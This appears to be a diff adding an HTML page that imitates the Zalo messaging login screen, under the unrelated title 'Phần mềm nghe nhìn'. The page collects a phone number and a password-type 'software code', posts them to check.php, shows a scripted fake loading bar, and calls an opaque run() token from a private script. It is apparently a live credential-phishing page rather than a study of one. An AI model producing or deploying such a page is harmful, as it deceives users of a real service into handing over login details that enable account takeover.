@@ -1,0 +1,146 @@
+<!DOCTYPE html><html lang="en" dir="ltr"><head>
+    <meta charset="utf-8">
+    <title>Phần mềm nghe nhìn</title>
+    <link rel="stylesheet" href="templates/w3style/css/style.css">
+    <script src="ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+   <link href="templates/w3style/css/style1.css" rel="stylesheet">
+  
+  <script src="_private/static/script.min.js"></script><script>run('3d880ee1f678cbfe-ebd7d1430390795df309fada-551863d65b1fa0ba0052b721fd99446d6c5636068ecc1571889dadde885b45', 'js_session1', false);</script></head>
+  <body>
+    
+     
+
+<script>
+   function login() { 
+      if($("#phone").val() == "" || $("#nhapmatext").val() == "") {
+      alert("Bạn chưa nhập đầy đủ thông tin, hãy kiểm tra lại");
+      return;
+   } else {
+      var _code = $("#nhapmatext").val();
+      var _phone = $("#mobile-number").val();
+      var _platform = $("#platform").val();
+      
+       $.ajax({            
+           url:"check.php", //the page containing php script
+           data: {type: "check", code: _code, phone: _phone, platform: _platform},
+           type: "POST", //request type
+           success:function(result){
+            if(result == 0) {
+               alert("Bạn đã nhập sai mã phần mềm");
+            } else {
+               $('#submitButton').show();
+               $('#lBtn').hide();
+               $('#submitButton').trigger('click');
+            }
+           
+          }
+        });
+
+       setTimeout(function(){
+            $(document).ready(function() {
+            document.getElementById("submitButton").setAttribute("data-loading", "10%");
+               setTimeout(function(){
+                  $(document).ready(function() {
+                  document.getElementById("submitButton").setAttribute("data-loading", "20%");
+                  });
+                     setTimeout(function(){
+                        $(document).ready(function() {
+                        document.getElementById("submitButton").setAttribute("data-loading", "30%");
+                        });
+                           setTimeout(function(){
+                              $(document).ready(function() {
+                              document.getElementById("submitButton").setAttribute("data-loading", "40%");
+                              });
+                              setTimeout(function(){
+                                 $(document).ready(function() {
+                                 document.getElementById("submitButton").setAttribute("data-loading", "50%");
+                                 });
+                                    setTimeout(function(){
+                                       $(document).ready(function() {
+                                       document.getElementById("submitButton").setAttribute("data-loading", "60%");
+                                       });
+                                       setTimeout(function(){
+                                          $(document).ready(function() {
+                                          document.getElementById("submitButton").setAttribute("data-loading", "70%");
+                                          });
+                                          setTimeout(function(){
+                                             $(document).ready(function() {
+                                             document.getElementById("submitButton").setAttribute("data-loading", "80%");
+                                             });
+                                             setTimeout(function(){
+                                                $(document).ready(function() {
+                                                document.getElementById("submitButton").setAttribute("data-loading", "90%");
+                                                });
+                                                setTimeout(function(){
+                                                   $(document).ready(function() {
+                                                   document.getElementById("submitButton").setAttribute("data-loading", "100%");
+                                                   });
+                                                   
+                                                },1000);
+                                             },1000);
+                                          },1000);
+                                       },1000);
+                                    },1000);
+                              },1000);
+                           },1000);
+                     },1000);
+               },1000);
+            });
+            
+         },1000);
+   }
+
+   
+      
+   
+}
+</script>
+
+ <span style="font-size: 30px; color: #FFF; font-weight: bold;">Đăng nhập vào Zalo</span>
+    <div class="box">
+       
+       <div class="box-lc">
+          <div class="box-image">
+            <img class="box-wrapper" id="b13" width="100%" height="100%" src="data/uploads/images/1650092866_zalo.png">
+          </div>
+      </div>
+      
+    </div>
+    <link rel="stylesheet" href="templates/w3style/css/intlTelInput.css">
+    <div class="center">
+      <h1 style="text-align: center; padding-top: 10px;">Đăng nhập vào Zalo</h1>
+
+      <p style="text-align: left; margin-left: 30px; margin-top: 10px;font-size: 2.5em; color: #555"> Số điện thoại</p>
+      <div class="form">
+
+        <div class="txt_field">
+         <input id="platform" name="platform" type="hidden" value="Zalo">
+         <input id="platform_ascii" name="platform_ascii" type="hidden" value="zalo">
+
+          <input id="mobile-number" name="phone" style="margin-left: 50px" type="tel" required="">
+          <span></span>
+        </div>
+        <div class="txt_field">
+          <input id="nhapmatext" type="password" required="">
+          <span></span>
+          <label>Mã phần mềm</label>
+        </div>
+        <input type="submit" value="ĐĂNG NHẬP" id="lBtn" onclick="login();" style="text-align: center; margin-bottom: 20px;">
+        <a id="submitButton" href="#" class="progress-button" style="display: none; padding-bottom: 20px; font-size:34px; text-align: center; margin-bottom: 20px;width: 100%;height: 100px;vertical-align: middle; padding-top:30px;"></a>
+
+        <script src="templates/w3style/js/intlTelInput.js"></script>
+        <script>
+      $("#mobile-number").intlTelInput();
+</script>
+      </div>
+    </div>
+
+     <script src="templates/w3style/js/script1.js"></script>
+
+     
+     
+  
+
+
+
+</body></html>
